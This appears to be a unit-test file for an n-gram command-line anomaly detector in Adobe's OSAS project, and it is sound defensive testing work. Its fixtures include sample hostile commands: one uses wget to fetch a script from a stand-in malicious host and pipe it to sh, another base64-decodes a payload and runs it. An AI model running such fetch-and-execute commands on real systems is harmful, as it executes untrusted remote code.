#
# Authors: Security Intelligence Team within the Security Coordination Center
#
# Copyright (c) 2018 Adobe Systems Incorporated. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
import unittest
import json
from collections import Counter, defaultdict
from typing import Dict, Any, List

from osas.core.label_generators import TextField
from osas.tests.test_utils import MockDatasource


class TestTextField(unittest.TestCase):
    """Test cases for TextField core functionality"""
    
    def setUp(self):
        """Set up test fixtures with realistic command patterns"""
        self.normal_commands = [
            {'command': 'ls -la /home/user'},
            {'command': 'cat /etc/passwd'},
            {'command': 'ps aux | grep python'},
            {'command': 'find /var -name "*.log"'},
            {'command': 'tail -f /var/log/syslog'},
            {'command': 'grep error /var/log/apache2/error.log'},
            {'command': 'netstat -tulpn'},
            {'command': 'chmod 755 script.sh'},
            {'command': 'ls -la'},
            {'command': 'cat file.txt'},
            {'command': 'ls -a'},
        ]
        
        self.anomalous_commands = [
            {'command': 'xyzzy_totally_unknown_malicious_command'},
            {'command': '/bin/sh -c "wget malicious.com/script.sh | sh"'},
            {'command': 'echo "encoded_payload" | base64 -d | sh'},
        ]
        
        self.mock_dataset = MockDatasource(self.normal_commands)
    
    def test_ngram_language_model_building(self):
        """Test core n-gram language model construction"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 3))
        
        # Build model and verify it captures linguistic patterns
        model = tf.build_model(self.mock_dataset)
        
        # Check that model learned meaningful patterns
        self.assertTrue(len(tf._model) > 0, "Model should contain n-gram patterns")
        self.assertTrue(len(tf._accepted_unigrams) > 0, "Should have learned vocabulary")
        self.assertGreater(tf._total_inf, 0, "Should have processed tokens")
        
        # Verify statistical properties were computed
        self.assertGreaterEqual(tf._mean_perplex, 0, "Mean score should be computed")
        self.assertGreaterEqual(tf._std_perplex, 0, "Std score should be computed")
        
        # Check that common command tokens are learned
        common_tokens = ['var', 'log', 'ls']
        learned_tokens = set(tf._accepted_unigrams.keys())
        found_common = [token for token in common_tokens if token in learned_tokens]
        self.assertTrue(len(found_common) > 0, f"Should learn common command tokens, found: {found_common}")
    
    def test_perplexity_based_anomaly_detection(self):
        """Test core perplexity computation for anomaly detection"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 4))
        tf.build_model(self.mock_dataset)
        
        # Test normal command - should have lower perplexity
        normal_perplexity = tf._compute_perplexity('ls -la /home')
        
        # Test anomalous command - should have higher perplexity
        anomalous_perplexity = tf._compute_perplexity('xyzzy')
        
        # Anomalous commands should generally have higher perplexity
        self.assertGreater(anomalous_perplexity, 0, "Score should be positive")
        self.assertGreater(normal_perplexity, 0, "Score should be positive")
        
        self.assertLess(normal_perplexity, anomalous_perplexity, "Normal variant of score (inverse) should be less than anomalous variant of score")
    
    def test_anomaly_classification_thresholds(self):
        """Test core anomaly classification using perplexity thresholds"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf.build_model(self.mock_dataset)
        
        # Test normal command classification
        normal_labels = tf({'command': 'ls -la /home/user'})
        
        # Test highly anomalous command
        anomalous_labels = tf({'command': 'execute_unknown_malware_binary_with_encoded_shellcode'})
        
        # Both should return lists
        self.assertIsInstance(normal_labels, list)
        self.assertIsInstance(anomalous_labels, list)
        self.assertTrue(len(normal_labels) > 0)
        self.assertTrue(len(anomalous_labels) > 0)

    
    def test_weighted_training_with_counts(self):
        """Test training with weighted examples using count column"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 3))
        
        # Training data with frequency weights
        weighted_data = [
            {'command': 'ls -la', 'count': 100},  # Very common
            {'command': 'cat /etc/passwd', 'count': 5},  # Less common
            {'command': 'malicious_binary', 'count': 1}  # Very rare
        ]
        
        tf.build_model(MockDatasource(weighted_data), count_column='count')
        
        # Common commands should have lower perplexity than rare ones
        common_perplexity = tf._compute_perplexity('ls -la')
        rare_perplexity = tf._compute_perplexity('malicious_binary')
        
        self.assertGreater(common_perplexity, 0, "Common command score should be positive")
        self.assertGreater(rare_perplexity, 0, "Rare command score should be positive")
        self.assertLess(common_perplexity, rare_perplexity, "Common command score should be less than rare command score")
    
    def test_model_serialization_and_persistence(self):
        """Test model serialization for production deployment"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 3))
        model = tf.build_model(self.mock_dataset)
        
        # Serialize and deserialize the model
        model_json = json.dumps(model)
        tf_loaded = TextField.from_pretrained(model_json)
        
        # Test that deserialized model performs identically
        test_commands = [
            'ls -la /home/user',
            'malicious_unknown_command_sequence',
            'cat /etc/passwd'
        ]
        
        for command in test_commands:
            original_labels = tf({'command': command})
            loaded_labels = tf_loaded({'command': command})
            
            self.assertEqual(original_labels, loaded_labels, 
                           f"Serialized model should produce identical results for: {command}")
    
    def test_edge_cases_and_robustness(self):
        """Test model robustness with edge cases"""
        tf = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf.build_model(self.mock_dataset)
        
        edge_cases = [
            '',  # Empty string
            ' ',  # Single space
            '\n\t',  # Whitespace
            'a',  # Single character
            'a' * 1000,  # Very long repetitive string
            '!@#$%^&*()',  # Special characters only
            '1234567890',  # Numbers only
            'ls' + ' ' * 100 + '-la',  # Excessive whitespace
        ]
        
        for case in edge_cases:
            try:
                labels = tf({'command': case})
                perplexity = tf._compute_perplexity(case)
            except Exception as e:
                self.fail(f"Model should handle edge case '{case[:20]}...' without errors, got: {e}")
    
    def test_correct_ngram_generation(self):
        """Test that ngrams are generated correctly for both character and token modes"""
        
        # Test token-based ngram generation
        tf_token = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf_token._accepted_unigrams = {'ls': 1, '-': 1, 'la': 1, '/': 1, 'home': 1, 'cat': 1, 'file': 1, 'txt': 1, '.': 1}
        
        # Test simple command
        text = "ls -la /home"
        ngrams = tf_token._get_ngrams(text)
        
        # Check that ngrams are tuples
        self.assertTrue(all(isinstance(ngram, tuple) for ngram in ngrams))
        
        # Check that we get both 2-grams and 3-grams
        bigrams = [ngram for ngram in ngrams if len(ngram) == 2]
        trigrams = [ngram for ngram in ngrams if len(ngram) == 3]
        
        self.assertTrue(len(bigrams) > 0, "Should generate bigrams")
        self.assertTrue(len(trigrams) > 0, "Should generate trigrams")
        
        # Check for sentence boundary markers
        start_markers = [ngram for ngram in ngrams if '<s>' in ngram]
        end_markers = [ngram for ngram in ngrams if '</s>' in ngram]
        
        self.assertTrue(len(start_markers) > 0, "Should include start-of-sentence markers")
        self.assertTrue(len(end_markers) > 0, "Should include end-of-sentence markers")
        
        
        expected_bigrams = [('<s>', 'ls'), ('ls', '-'), ('-', 'la')]
        expected_trigrams = [('<s>', 'ls', '-'), ('ls', '-', 'la')]
        
        for expected_bigram in expected_bigrams:
            self.assertIn(expected_bigram, ngrams, f"Should contain bigram {expected_bigram}")
        
        for expected_trigram in expected_trigrams:
            self.assertIn(expected_trigram, ngrams, f"Should contain trigram {expected_trigram}")
        
        # Test character-based ngram generation
        tf_char = TextField('command', lm_mode='char', ngram_range=(3, 4))
        tf_char._accepted_unigrams = {c: 1 for c in 'cat'}
        
        char_ngrams = tf_char._get_ngrams("cat")
        trigrams_char = [ngram for ngram in char_ngrams if len(ngram) == 3]
        fourgrams_char = [ngram for ngram in char_ngrams if len(ngram) == 4]
        
        self.assertTrue(len(trigrams_char) > 0, "Should generate character trigrams")
        self.assertTrue(len(fourgrams_char) > 0, "Should generate character 4-grams")
        
        # Check key character trigrams
        expected_char_trigrams = [('<s>', '<s>', 'c'), ('c', 'a', 't'), ('t', '</s>', '</s>')]
        for expected_trigram in expected_char_trigrams:
            self.assertIn(expected_trigram, char_ngrams, f"Should contain character trigram {expected_trigram}")
        
        # Test unigrams_only flag
        unigrams = tf_token._get_ngrams("ls -la", unigrams_only=True)
        self.assertTrue(all(isinstance(token, str) for token in unigrams), "Unigrams should be strings, not tuples")
        self.assertIn('ls', unigrams, "Should contain 'ls' token")
        
        # Test UNK token replacement
        tf_limited = TextField('command', lm_mode='token', ngram_range=(2, 2))
        tf_limited._accepted_unigrams = {'ls': 1}
        
        unknown_ngrams = tf_limited._get_ngrams("ls unknown_command")
        unk_ngrams = [ngram for ngram in unknown_ngrams if '<UNK>' in ngram]
        self.assertTrue(len(unk_ngrams) > 0, "Should generate ngrams with <UNK> for unknown tokens")
        
    def test_ngram_range_validation(self):
        """Test that different ngram ranges produce correct ngram counts and types"""
        
        # Test multiple ngram orders
        tf = TextField('command', lm_mode='token', ngram_range=(1, 3))
        tf._accepted_unigrams = {'test': 1, 'command': 1, 'here': 1}
        
        ngrams = tf._get_ngrams("test command here")
        unigrams = [ngram for ngram in ngrams if len(ngram) == 1]
        bigrams = [ngram for ngram in ngrams if len(ngram) == 2]
        trigrams = [ngram for ngram in ngrams if len(ngram) == 3]
        
        self.assertTrue(len(unigrams) > 0, "Should generate unigrams")
        self.assertTrue(len(bigrams) > 0, "Should generate bigrams")
        self.assertTrue(len(trigrams) > 0, "Should generate trigrams")
        
        # Test single ngram order
        tf_single = TextField('command', lm_mode='token', ngram_range=(2, 2))
        tf_single._accepted_unigrams = {'test': 1, 'command': 1}
        
        single_ngrams = tf_single._get_ngrams("test command")
        self.assertTrue(all(len(ngram) == 2 for ngram in single_ngrams), "Should only generate bigrams")
        self.assertEqual(len(single_ngrams), 3, "Should generate exactly 3 bigrams")

    def test_merge_behavior_combined(self):
        """Test TextField.merge by comparing with a combined dataset baseline"""
        # Two separate datasets with enough repetition to ensure unigrams are accepted consistently
        data_a = [
            {'command': 'ls -la'},
            {'command': 'ls -la'},
            {'command': 'ls -la'},
            {'command': 'cat file.txt'},
            {'command': 'cat file.txt'},
            {'command': 'cat file.txt'},
        ]
        data_b = [
            {'command': 'ls -la'},
            {'command': 'ls -la'},
            {'command': 'ls -la'},
            {'command': 'grep error'},
            {'command': 'grep error'},
            {'command': 'grep error'},
        ]

        dataset_a = MockDatasource(data_a)
        dataset_b = MockDatasource(data_b)
        
        combined_data = data_a + data_b
        dataset_combined = MockDatasource(combined_data)
        
        # Build separate models and merge
        tf_a = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf_b = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf_a.build_model(dataset_a)
        tf_b.build_model(dataset_b)
        tf_a.merge([tf_b])
        tf_a.compute_statistics(dataset_combined)
        
        # Build baseline model on combined dataset
        tf_baseline = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf_baseline.build_model(dataset_combined)
        
        # Compare key properties
        self.assertEqual(tf_a._total_inf, tf_baseline._total_inf, "Total inference counts should match")
        
        # N-gram counts should be identical for shared patterns
        test_ngrams = [('ls', '-'), ('ls', '-', 'la'), ('grep', 'error')]
        for ngram in test_ngrams:
            if ngram in tf_a._model and ngram in tf_baseline._model:
                self.assertEqual(tf_a._model[ngram], tf_baseline._model[ngram], 
                               f"N-gram count for {ngram} should match")
        
        # Accepted unigrams should be the same
        self.assertEqual(set(tf_a._accepted_unigrams.keys()), 
                        set(tf_baseline._accepted_unigrams.keys()),
                        "Accepted unigrams should match")
        
        # Mean and standard deviation should match
        self.assertAlmostEqual(tf_a._mean_perplex, tf_baseline._mean_perplex, places=6,
                              msg="Mean perplexity should match between merged and baseline models")
        self.assertAlmostEqual(tf_a._std_perplex, tf_baseline._std_perplex, places=6,
                              msg="Standard deviation should match between merged and baseline models")
        
        # Test that merge ignores non-TextField objects
        tf_test = TextField('command', lm_mode='token', ngram_range=(2, 3))
        tf_test.build_model(dataset_a)
        original_total = tf_test._total_inf
        tf_test.merge([tf_b, "not_a_textfield", 123, None])
        self.assertEqual(tf_test._total_inf, tf_a._total_inf, 
                        "Should ignore non-TextField objects in merge list")


if __name__ == '__main__':
    unittest.main()
